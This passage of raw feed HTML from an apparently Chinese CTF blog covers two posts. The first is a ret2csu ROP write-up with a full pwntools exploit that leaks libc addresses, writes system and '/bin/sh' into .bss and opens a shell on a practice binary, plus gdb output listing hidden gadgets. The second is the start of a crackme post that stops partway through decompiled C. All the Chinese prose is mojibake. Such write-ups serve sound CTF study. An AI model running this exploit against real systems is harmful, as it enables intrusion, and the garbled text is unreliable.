class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write(STDOUT_FILENO, write_got, 8);</span></span><br><span class="line"><span class="comment"># r12 = write_got</span></span><br><span class="line"><span class="comment"># rdi = 1, rsi = write_got, rdx = 8</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main)</span><br><span class="line">write = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'write = '</span> + hex(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write)</span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;'</span>)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">execve = libc_base + libc.dump(<span class="string">'execve'</span>)</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">log.success(<span class="string">'execve = '</span> + hex(execve))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹libcçš„æ³„æ¼åŒæ ·ä¹Ÿå¯ä»¥é€šè¿‡<code>DynELF</code>æ¥çˆ†ç ´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, address, <span class="number">8</span>, main_addr)</span><br><span class="line">data = p.recv(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;'</span>)</span><br><span class="line">dynelf = DynELF(leak, elf=elf)</span><br><span class="line">system_addr = dynelf.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°libcåå¯ä»¥è·å¾—<code>system</code>æˆ–è€…æ˜¯<code>execve</code>çš„åç§»ã€‚åŒæ—¶æˆ‘ä»¬å‘ç°bssæ®µå¯å†™ï¼Œæ•…æ¥ä¸‹æ¥åœ¨bssæ®µå†™å…¥systemçš„åœ°å€ï¼Œä»¥åŠå­—ç¬¦ä¸²<code>/bin/sh</code>ï¼š</p><p><img src="/pics/ä¸­çº§ROP-ret2__libc_csu_init-writeup/1.png" alt="bssæ®µå¯å†™"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># read(STDIN_FILENO, bss, 16)</span></span><br><span class="line"><span class="comment"># r12 = read_got</span></span><br><span class="line"><span class="comment"># rdi = 0, rsi = bss, rdx = 16</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss, <span class="number">16</span>, main)</span><br><span class="line">payload = flat([system, <span class="string">'/bin/sh\x00'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>æœ€åä¸€éƒ¨åªéœ€è¦æ‰§è¡Œ<code>call</code>å·²ç»å†™å…¥çš„systemå¹¶ä¸”å°†<code>/bin/sh</code>ä½œä¸ºå‚æ•°æ‰§è¡Œå³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># execve("/bin/sh"); or system("/bin/sh");</span></span><br><span class="line"><span class="comment"># r12 = execve/system</span></span><br><span class="line"><span class="comment"># rdi = bss + 8 = "/bin/sh"</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; EXECUTE execve("/bin/sh") OR system("/bin/sh") &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss, bss + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main)</span><br></pre></td></tr></table></figure><p>æ•´ç†ä¸€ä¸‹ï¼Œæœ€åçš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line"><span class="comment"># p = remote('127.0.0.1',10001)</span></span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">log.success(<span class="string">'write_got = '</span> + hex(write_got))</span><br><span class="line">log.success(<span class="string">'read_got = '</span> + hex(read_got))</span><br><span class="line">log.success(<span class="string">'main = '</span> + hex(main))</span><br><span class="line">log.success(<span class="string">'bss = '</span> + hex(bss))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  4005f0:       4c 89 fa                mov    rdx,r15</span></span><br><span class="line"><span class="comment">#  4005f3:       4c 89 f6                mov    rsi,r14</span></span><br><span class="line"><span class="comment">#  4005f6:       44 89 ef                mov    edi,r13d</span></span><br><span class="line"><span class="comment">#  4005f9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line"><span class="comment">#  4005fd:       48 83 c3 01             add    rbx,0x1</span></span><br><span class="line"><span class="comment">#  400601:       48 39 eb                cmp    rbx,rbp</span></span><br><span class="line"><span class="comment">#  400604:       75 ea                   jne    4005f0 &lt;__libc_csu_init+0x50&gt;</span></span><br><span class="line"><span class="comment">#  400606:       48 8b 5c 24 08          mov    rbx,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="comment">#  40060b:       48 8b 6c 24 10          mov    rbp,QWORD PTR [rsp+0x10]</span></span><br><span class="line"><span class="comment">#  400610:       4c 8b 64 24 18          mov    r12,QWORD PTR [rsp+0x18]</span></span><br><span class="line"><span class="comment">#  400615:       4c 8b 6c 24 20          mov    r13,QWORD PTR [rsp+0x20]</span></span><br><span class="line"><span class="comment">#  40061a:       4c 8b 74 24 28          mov    r14,QWORD PTR [rsp+0x28]</span></span><br><span class="line"><span class="comment">#  40061f:       4c 8b 7c 24 30          mov    r15,QWORD PTR [rsp+0x30]</span></span><br><span class="line"><span class="comment">#  400624:       48 83 c4 38             add    rsp,0x38</span></span><br><span class="line"><span class="comment">#  400628:       c3                      ret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret_addr)</span>:</span></span><br><span class="line">payload = flat([<span class="string">'\x00'</span> * <span class="number">136</span>, <span class="number">0x400606</span>, <span class="number">0</span>, rbx, rbp, r12, r13, r14, r15, <span class="number">0x4005f0</span>, <span class="string">'\x00'</span> * <span class="number">56</span>, ret_addr])</span><br><span class="line"><span class="comment"># print repr(payload)</span></span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rdi = edi = r13, rsi = r14, rdx = r15</span></span><br><span class="line"><span class="comment"># write(STDOUT_FILENO, write_got, 8);</span></span><br><span class="line"><span class="comment"># r12 = write_got</span></span><br><span class="line"><span class="comment"># rdi = 1, rsi = write_got, rdx = 8</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main)</span><br><span class="line">write = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'write = '</span> + hex(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write)</span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;'</span>)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">execve = libc_base + libc.dump(<span class="string">'execve'</span>)</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">log.success(<span class="string">'execve = '</span> + hex(execve))</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(STDIN_FILENO, bss, 16);</span></span><br><span class="line"><span class="comment"># r12 = read_got</span></span><br><span class="line"><span class="comment"># rdi = 0, rsi = bss, rdx = 16</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss, <span class="number">16</span>, main)</span><br><span class="line">payload = flat([system, <span class="string">'/bin/sh\x00'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execve("/bin/sh"); or system("/bin/sh");</span></span><br><span class="line"><span class="comment"># r12 = execve/system</span></span><br><span class="line"><span class="comment"># rdi = bss + 8 = "/bin/sh"</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; EXECUTE execve("/bin/sh") OR system("/bin/sh") &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss, bss + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main)</span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>åšé¢˜çš„æ—¶å€™é‡åˆ°çš„ä¸€ä¸ªå°bugæ˜¯å½“ä¼ çš„payloadä¸­çš„æ— æ„ä¹‰å­—ç¬¦å¦‚æœä¸ä¸º<code>\x00</code>ï¼Œæœ€åè·‘systemä¼šåæ‰ï¼Œä½†æ˜¯execveä¸ä¼šå½±å“ã€‚å¦‚æœå°†bufå¡«å……ä¸º<code>\x00</code>ï¼Œæ‰å¯ä»¥æ‰§è¡Œsystemã€‚å…·ä½“åŸå› è¿˜æ²¡æœ‰å¼„æ¸…æ¥šã€‚</p><p>ä»¥ä¸‹å†è¡¥å……ä¸€ç‚¹å…³äº<code>__libc_csu_init()</code>çš„ç‚¹ï¼Œä¹Ÿå°±æ˜¯éšè—gadgetsï¼š</p><p><img src="/pics/ä¸­çº§ROP-ret2__libc_csu_init-writeup/2.png" alt="éšè—gadgets"></p><p>ä¹Ÿæ˜¯libcè®¾è®¡æ—¶çš„ä¸€ä¸ªbugï¼Œä¸åŒçš„åç§»ä¸‹ï¼Œè¿˜èƒ½å¤Ÿå¾—åˆ°<code>pop rdi ; ret</code>å’Œ<code>pop rsi ; pop r15 ; ret</code>ä¸¤ä¸ªgadgetsï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061A</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:pop    rbx</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061B</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061C</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061D</span><br><span class="line">   0x40061d &lt;__libc_csu_init+93&gt;:pop    rsp</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061E</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x400625:nop</span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061F</span><br><span class="line">   0x40061f &lt;__libc_csu_init+95&gt;:pop    rbp</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x400625:nop</span><br><span class="line">assassinq&gt;&gt; x/5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x400625:nop</span><br><span class="line">   0x400626:nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">assassinq&gt;&gt; x/5i 0x0000000000400621</span><br><span class="line">   0x400621 &lt;__libc_csu_init+97&gt;:pop    rsi</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x400625:nop</span><br><span class="line">   0x400626:nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">assassinq&gt;&gt; x/5i 0x0000000000400622</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x400625:nop</span><br><span class="line">   0x400626:nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:repz ret </span><br><span class="line">assassinq&gt;&gt; x/5i 0x0000000000400623</span><br><span class="line">   0x400623 &lt;__libc_csu_init+99&gt;:pop    rdi</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x400625:nop</span><br><span class="line">   0x400626:nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:repz ret</span><br><span class="line">assassinq&gt;&gt; quit</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒç½‘ç«™"><a href="#å‚è€ƒç½‘ç«™" class="headerlink" title="å‚è€ƒç½‘ç«™"></a>å‚è€ƒç½‘ç«™</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#ret2csu" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#ret2csu</a><br><a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/</a><br><a href="https://raw.githubusercontent.com/zhengmin1989/MyArticles/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html" target="_blank" rel="noopener">https://raw.githubusercontent.com/zhengmin1989/MyArticles/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html</a><br><a href="https://www.jianshu.com/p/73fff078c19c" target="_blank" rel="noopener">https://www.jianshu.com/p/73fff078c19c</a><br><a href="https://www.jianshu.com/p/a32dc72bb20f" target="_blank" rel="noopener">https://www.jianshu.com/p/a32dc72bb20f</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç”¨è’¸ç±³çš„ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux_x64ç¯‡ä¸­çš„level5æ¥ç ”ç©¶ä¸€ä¸‹64ä½çš„ROPã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="pwn" scheme="https://qianfei11.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2019-å¾çˆ±ç ´è§£è§£é¢˜é¢†çº¢åŒ…æ´»åŠ¨</title>
    <link href="https://qianfei11.github.io/2019/02/10/2019-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E6%B4%BB%E5%8A%A8/"/>
    <id>https://qianfei11.github.io/2019/02/10/2019-å¾çˆ±ç ´è§£è§£é¢˜é¢†çº¢åŒ…æ´»åŠ¨/</id>
    <published>2019-02-10T12:33:03.000Z</published>
    <updated>2019-02-20T12:15:58.998Z</updated>
    
    <content type="html"><![CDATA[<p>åšäº†ç‚¹ç®€å•çš„é¢˜ç›®ã€‚</p><a id="more"></a><h1 id="ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ä¸€"><a href="#ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ä¸€" class="headerlink" title="ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ä¸€"></a>ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ä¸€</h1><p>æ‰«ç å…³æ³¨å³å¯ã€‚</p><p><img src="/pics/2019-å¾çˆ±ç ´è§£è§£é¢˜é¢†çº¢åŒ…æ´»åŠ¨/1.jpg" alt="ç¬¬ä¸€å…³å£ä»¤"></p><h1 id="ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹äºŒ"><a href="#ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹äºŒ" class="headerlink" title="ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹äºŒ"></a>ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹äºŒ</h1><p>æŸ¥å£³æ˜¯upxï¼ŒESPå®šå¾‹æ³•æ‰¾åˆ°OEPè„±å£³ã€‚ç„¶åæ”¾è¿›idaé‡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HWND <span class="title">main_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HWND result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *input; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *key; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> enc_1; <span class="comment">// [esp+0h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> enc_2; <span class="comment">// [esp+4h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> enc_3; <span class="comment">// [esp+8h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> enc_4; <span class="comment">// [esp+Ch] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+10h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = GetDlgItem(<span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( GetWindowTextLengthA(result) == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      input = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x11</span>u);</span><br><span class="line">      key = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x11</span>u);</span><br><span class="line">      *(_DWORD *)input = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)input + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)input + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)input + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">      input[<span class="number">16</span>] = <span class="number">0</span>;</span><br><span class="line">      *(_DWORD *)key = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)key + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)key + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)key + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">      key[<span class="number">16</span>] = <span class="number">0</span>;</span><br><span class="line">      GetDlgItemTextA(<span class="number">0</span>, <span class="number">1000</span>, input, <span class="number">17</span>);</span><br><span class="line">      enc_3 = 'udhY';</span><br><span class="line">      enc_1 = 'ssdH';</span><br><span class="line">      enc_2 = 'zhNb';</span><br><span class="line">      enc_4 = '9102';</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      encrypt((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;enc_1, (<span class="keyword">int</span>)key, <span class="number">3</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(key, input) )</span><br><span class="line">        result = (HWND)MessageBoxA(<span class="number">0</span>, aOye, Caption, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        result = (HWND)MessageBoxA(<span class="number">0</span>, aAuey, Caption, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (HWND)MessageBoxA(<span class="number">0</span>, &amp;Text, Caption, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹ä¸‹æ¥åº”è¯¥å°±æ˜¯æŠŠ16ä½çš„<code>enc</code>åŠ å¯†äº†ä¸€ä¸‹ï¼Œç„¶åå’Œ<code>input</code>æ¯”è¾ƒã€‚çœ‹çœ‹<code>encrypt()</code>å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 